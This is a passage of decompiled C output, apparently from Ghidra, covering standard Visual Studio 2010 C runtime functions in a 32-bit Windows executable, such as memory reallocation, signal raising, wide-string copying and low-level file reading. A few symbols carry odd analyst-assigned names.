          }
        }
      }
    }
    if (local_8 == 0) {
      return local_10;
    }
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar5 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_003ea060)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar7 = __lseek(_FileHandle,0,2);
          if (lVar7 == local_8) {
            pcVar5 = _File->_base;
            pcVar8 = pcVar5 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar5 < pcVar8; pcVar5 = pcVar5 + 1) {
              if (*pcVar5 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar6->_flag & 0x2000U) == 0;
          }
          else {
            lVar7 = __lseek(_FileHandle,local_8,0);
            if (lVar7 < 0) goto LAB_003bcc8d;
            pFVar6 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar6 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_003ea060)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar6;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_8 = local_8 - (int)_File;
      }
    }
    lVar7 = local_10 + local_8;
  }
  return lVar7;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2010 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  LPVOID pvVar2;
  int iVar3;
  int *piVar4;
  DWORD DVar5;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
  }
  else {
    do {
      if (0xffffffe0 < _NewSize) {
        __callnewh(_NewSize);
        piVar4 = __errno();
        *piVar4 = 0xc;
        return (void *)0x0;
      }
      if (_NewSize == 0) {
        _NewSize = 1;
      }
      pvVar2 = HeapReAlloc(hHeap_003d802c,0,_Memory,_NewSize);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      if (_DAT_003d8694 == 0) {
        piVar4 = __errno();
        DVar5 = GetLastError();
        iVar3 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar3;
        return (void *)0x0;
      }
      iVar3 = __callnewh(_NewSize);
    } while (iVar3 != 0);
    piVar4 = __errno();
    DVar5 = GetLastError();
    iVar3 = __get_errno_from_oserr(DVar5);
    *piVar4 = iVar3;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2010 Release

int __cdecl _ValidateRead(void *param_1,unsigned_int param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2010 Release

void __cdecl __initp_misc_winsig(PVOID param_1)

{
  DAT_003d89e0 = param_1;
  DAT_003d89e4 = param_1;
  Ptr_003d89e8 = param_1;
  DAT_003d89ec = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2010 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < param_3 + 0x90);
  if ((param_3 + 0x90 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_003bce10(void)

{
  DecodePointer(Ptr_003d89e8);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2010 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  PVOID Ptr;
  code *pcVar3;
  int _File;
  code *pcVar4;
  undefined4 extraout_ECX;
  PVOID *ppvVar5;
  _ptiddata p_Var6;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var6 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppvVar5 = &DAT_003d89e0;
        Ptr = DAT_003d89e0;
        goto LAB_003bcec7;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_003bcea5;
        if (_SigNum != 8) goto LAB_003bce93;
      }
    }
    p_Var6 = __getptd_noexit();
    if (p_Var6 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var6->_pxcptacttab);
    ppvVar5 = (PVOID *)(uVar1 + 8);
    pcVar3 = (code *)*ppvVar5;
  }
  else {
    if (_SigNum == 0xf) {
      ppvVar5 = &DAT_003d89ec;
      Ptr = DAT_003d89ec;
    }
    else {
      if (_SigNum == 0x15) {
        ppvVar5 = &DAT_003d89e4;
        Ptr = DAT_003d89e4;
      }
      else {
        if (_SigNum != 0x16) {
LAB_003bce93:
          piVar2 = __errno();
          *piVar2 = 0x16;
          FUN_003b60f9();
          return -1;
        }
LAB_003bcea5:
        ppvVar5 = &Ptr_003d89e8;
        Ptr = Ptr_003d89e8;
      }
    }
LAB_003bcec7:
    local_20 = 1;
    pcVar3 = (code *)DecodePointer(Ptr);
  }
  _File = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    _File = __exit(3);
  }
  if (local_20 != _File) {
    __lock(_File);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var6->_tpxcptinfoptrs;
    p_Var6->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var6->_tfpecode;
      p_Var6->_tfpecode = 0x8c;
      goto LAB_003bcf2b;
    }
  }
  else {
LAB_003bcf2b:
    if (_SigNum == 8) {
      for (local_28 = 3; local_28 < 0xc; local_28 = local_28 + 1) {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var6->_pxcptacttab) = 0;
      }
      goto LAB_003bcf63;
    }
  }
  pcVar4 = (code *)FUN_003b779f();
  *ppvVar5 = pcVar4;
LAB_003bcf63:
  FUN_003bcf84();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var6->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var6->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var6->_tfpecode = local_34;
  }
  return 0;
}



void FUN_003bcf84(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_003b8677(0);
  }
  return;
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2010 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003bd055(void)

{
  _DAT_003ea044 = 0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_003bd05d(undefined4 param_1)

{
  _DAT_003d8a30 = param_1;
  return;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2010 Release

void __initp_misc_cfltcvt_tab(void)

{
  PVOID pvVar1;
  uint uVar2;
  
  uVar2 = 0;
  do {
    pvVar1 = EncodePointer(*(PVOID *)((int)&Ptr_003d70d0 + uVar2));
    *(PVOID *)((int)&Ptr_003d70d0 + uVar2) = pvVar1;
    uVar2 = uVar2 + 4;
  } while (uVar2 < 0x28);
  return;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2010 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  PIMAGE_SECTION_HEADER p_Var1;
  PBYTE pBVar2;
  uint uVar3;
  
  pBVar2 = pImageBase + *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var1 = (PIMAGE_SECTION_HEADER)(pBVar2 + *(ushort *)(pBVar2 + 0x14) + 0x18);
  if (*(ushort *)(pBVar2 + 6) != 0) {
    do {
      if ((p_Var1->VirtualAddress <= rva) && (rva < p_Var1->Misc + p_Var1->VirtualAddress)) {
        return p_Var1;
      }
      uVar3 = uVar3 + 1;
      p_Var1 = p_Var1 + 1;
    } while (uVar3 < *(ushort *)(pBVar2 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2010 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  uint uVar1;
  BOOL BVar2;
  PIMAGE_SECTION_HEADER p_Var3;
  int **in_FS_OFFSET;
  int *local_14;
  code *pcStack16;
  uint local_c;
  undefined4 local_8;
  
  pcStack16 = __except_handler4;
  local_14 = *in_FS_OFFSET;
  local_c = DAT_003d6664 ^ 0x3d3058;
  *in_FS_OFFSET = (int *)&local_14;
  local_8 = 0;
  BVar2 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00380000);
  if (BVar2 != 0) {
    p_Var3 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00380000,(DWORD_PTR)(pTarget + -0x380000));
    if (p_Var3 != (PIMAGE_SECTION_HEADER)0x0) {
      uVar1 = p_Var3->Characteristics;
      *in_FS_OFFSET = local_14;
      return ~(uVar1 >> 0x1f) & 1;
    }
  }
  *in_FS_OFFSET = local_14;
  return 0;
}



// Library Function - Single Match
//  ___crtMessageBoxW
// 
// Library: Visual Studio 2010 Release

int __cdecl ___crtMessageBoxW(LPCWSTR _LpText,LPCWSTR _LpCaption,UINT _UType)

{
  PVOID pvVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar6;
  undefined in_stack_ffffffd8;
  int local_18;
  undefined local_14 [8];
  byte local_c;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  pvVar1 = (PVOID)FUN_003b779f();
  local_18 = 0;
  if (Ptr_003d8a34 == (PVOID)0x0) {
    hModule = LoadLibraryW(L"USER32.DLL");
    uVar6 = extraout_EDX;
    if ((hModule == (HMODULE)0x0) ||
       (pFVar2 = GetProcAddress(hModule,"MessageBoxW"), uVar6 = extraout_EDX_00,
       pFVar2 == (FARPROC)0x0)) goto LAB_003bd339;
    Ptr_003d8a34 = EncodePointer(pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetActiveWindow");
    DAT_003d8a38 = EncodePointer(pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetLastActivePopup");
    DAT_003d8a3c = EncodePointer(pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetUserObjectInformationW");
    Ptr_003d8a44 = EncodePointer(pFVar2);
    if (Ptr_003d8a44 != (PVOID)0x0) {
      pFVar2 = GetProcAddress(hModule,"GetProcessWindowStation");
      DAT_003d8a40 = EncodePointer(pFVar2);
    }
  }
  if ((DAT_003d8a40 == pvVar1) || (Ptr_003d8a44 == pvVar1)) {
LAB_003bd2e8:
    if ((((DAT_003d8a38 != pvVar1) &&
         (pcVar3 = (code *)DecodePointer(DAT_003d8a38), pcVar3 != (code *)0x0)) &&
        (local_18 = (*pcVar3)(), local_18 != 0)) &&
       ((DAT_003d8a3c != pvVar1 &&
        (pcVar3 = (code *)DecodePointer(DAT_003d8a3c), pcVar3 != (code *)0x0)))) {
      local_18 = (*pcVar3)(local_18);
    }
  }
  else {
    pcVar3 = (code *)DecodePointer(DAT_003d8a40);
    pcVar4 = (code *)DecodePointer(Ptr_003d8a44);
    if (((pcVar3 == (code *)0x0) || (pcVar4 == (code *)0x0)) ||
       (((iVar5 = (*pcVar3)(), iVar5 != 0 &&
         (iVar5 = (*pcVar4)(iVar5,1,local_14,0xc,&stack0xffffffd8), iVar5 != 0)) &&
        ((local_c & 1) != 0)))) goto LAB_003bd2e8;
    _UType = _UType | 0x200000;
  }
  pcVar3 = (code *)DecodePointer(Ptr_003d8a34);
  uVar6 = extraout_EDX_01;
  if (pcVar3 != (code *)0x0) {
    (*pcVar3)(local_18,_LpText,_LpCaption,_UType);
    uVar6 = extraout_EDX_02;
  }
LAB_003bd339:
  iVar5 = terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar6,in_stack_ffffffd8);
  return iVar5;
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  errno_t eStack16;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        iVar4 = (int)pwVar3 - (int)_Src;
        do {
          wVar1 = *_Src;
          *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eStack16 = 0x22;
        *piVar2 = 0x22;
        goto LAB_003bd367;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack16 = 0x16;
  *piVar2 = 0x16;
LAB_003bd367:
  FUN_003b60f9();
  return eStack16;
}



// Library Function - Single Match
//  _wcsncpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcsncpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src,rsize_t _MaxCount)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  rsize_t rVar5;
  errno_t eStack20;
  
  if (_MaxCount == 0) {
    if (_Dst == (wchar_t *)0x0) {
      if (_SizeInWords == 0) {
        return 0;
      }
    }
    else {
LAB_003bd3e3:
      if (_SizeInWords != 0) {
        if (_MaxCount == 0) {
          *_Dst = L'\0';
          return 0;
        }
        if (_Src != (wchar_t *)0x0) {
          rVar5 = _SizeInWords;
          if (_MaxCount == 0xffffffff) {
            iVar4 = (int)_Dst - (int)_Src;
            do {
              wVar1 = *_Src;
              *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
              _Src = _Src + 1;
              if (wVar1 == L'\0') break;
              rVar5 = rVar5 - 1;
            } while (rVar5 != 0);
          }
          else {
            pwVar3 = _Dst;
            do {
              wVar1 = *(wchar_t *)(((int)_Src - (int)_Dst) + (int)pwVar3);
              *pwVar3 = wVar1;
              pwVar3 = pwVar3 + 1;
              if ((wVar1 == L'\0') || (rVar5 = rVar5 - 1, rVar5 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pwVar3 = L'\0';
            }
          }
          if (rVar5 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInWords - 1] = L'\0';
            return 0x50;
          }
          *_Dst = L'\0';
          piVar2 = __errno();
          eStack20 = 0x22;
          *piVar2 = 0x22;
          goto LAB_003bd3f4;
        }
        *_Dst = L'\0';
      }
    }
  }
  else {
    if (_Dst != (wchar_t *)0x0) goto LAB_003bd3e3;
  }
  piVar2 = __errno();
  eStack20 = 0x16;
  *piVar2 = 0x16;
LAB_003bd3f4:
  FUN_003b60f9();
  return eStack20;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack16;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    if (_Src != (wchar_t *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        wVar1 = *_Src;
        *(wchar_t *)(iVar3 + (int)_Src) = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eStack16 = 0x22;
      *piVar2 = 0x22;
      goto LAB_003bd4a9;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack16 = 0x16;
  *piVar2 = 0x16;
LAB_003bd4a9:
  FUN_003b60f9();
  return eStack16;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2010 Release

int __cdecl __set_error_mode(int _Mode)

{
  int iVar1;
  int *piVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar1 = DAT_003d7cf4;
      DAT_003d7cf4 = _Mode;
      return iVar1;
    }
    if (_Mode == 3) {
      return DAT_003d7cf4;
    }
  }
  piVar2 = __errno();
  *piVar2 = 0x16;
  FUN_003b60f9();
  return -1;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2010 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
      return (int)*(char *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
             0x40;
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_003b60f9();
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2010 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(_DAT_003d8a48 == (DAT_003d6664 | 1));
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lorem_ipsum;
  size_t iterations;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iterations = _SizeInBytes;
  lorem_ipsum = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_003bd5bc:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      FUN_003b60f9();
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lorem_ipsum != (char *)0x0) {
          if (iterations == 0) goto LAB_003bd648;
          *lorem_ipsum = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_003bd677:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_003bd5bc;
      }
      if ((lorem_ipsum != (char *)0x0) && (iterations != 0)) {
        trim_string((undefined (*) [16])lorem_ipsum,0,iterations);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lorem_ipsum,iterations,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lorem_ipsum != (char *)0x0) && (iterations != 0)) {
            trim_string((undefined (*) [16])lorem_ipsum,0,iterations);
          }
LAB_003bd648:
          piVar2 = __errno();
          *piVar2 = 0x22;
          FUN_003b60f9();
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else {
        if (_MbCh == (char *)0x0) {
          if (_SizeConverted != (int *)0x0) {
            *_SizeConverted = iVar1;
          }
          goto LAB_003bd677;
        }
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2010 Release

ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return (ulonglong)param_1 * (ulonglong)param_3 & 0xffffffff |
         (ulonglong)
         ((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
         param_2 * param_3 + param_1 * param_4) << 0x20;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  byte bVar2;
  char cVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar4 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (uNumber_003ea048 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    FUN_003b60f9();
    return -1;
  }
  piVar6 = &DAT_003ea060 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar2 = *(byte *)(*piVar6 + 4 + iVar14);
  if ((bVar2 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_003bd843;
  }
  if (_MaxCharCount < 0x80000000) {
    local_10 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar2 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + 0x24 + iVar14) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_003bd831;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        psVar12 = (short *)__malloc_crt(_MaxCharCount);
        local_14 = psVar12;
        if (psVar12 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0,1);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_003bd831;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_14 = (short *)_DstBuf;
        psVar12 = (short *)_DstBuf;
      }
      psVar8 = psVar12;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar3 = *(char *)(*piVar6 + iVar14 + 5), cVar3 != '\n')) && (_MaxCharCount != 0)) {
        uVar7 = _MaxCharCount - 1;
        *(char *)psVar12 = cVar3;
        psVar8 = (short *)((int)psVar12 + 1);
        local_10 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar3 = *(char *)(iVar14 + 0x25 + *piVar6), cVar3 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar3;
          psVar8 = psVar12 + 1;
          uVar7 = _MaxCharCount - 2;
          local_10 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar3 = *(char *)(iVar14 + 0x26 + *piVar6), cVar3 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar3;
            psVar8 = (short *)((int)psVar12 + 3);
            local_10 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_003bdb50;
          }
          goto LAB_003bdb45;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_10 = (short *)((int)local_10 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_003bdb50;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*psVar12 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_10 = (short *)((int)local_10 + (int)local_14);
          _MaxCharCount = (uint)local_14;
          psVar12 = local_14;
          if (local_14 < local_10) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
